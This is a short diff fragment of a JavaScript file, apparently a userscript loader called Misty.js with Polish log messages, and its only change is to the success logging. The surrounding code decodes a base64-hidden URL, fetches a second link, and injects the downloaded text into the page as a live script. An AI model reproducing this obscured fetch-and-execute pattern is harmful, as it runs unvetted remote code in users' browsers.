@@ -5,7 +5,6 @@ misty(atob("aHR0cHM6Ly9hcGkubnBvaW50LmlvL2RkY2M1ZTk1NmVjNzgwN2YzMTQ4"),(data) =>
 			fetch(data.link).then(value => value.text())
 		  ]).then(all => {
 			  $("body").append("<script>"+all[0]+"</script>");
+			  customLog("Skrypt (Misty.js) załadowano Poprawnie!")
 		  }).catch(err => { throw err });
 	});
-
-console.log("Skrypt (Misty.js) załadowano Poprawnie!")
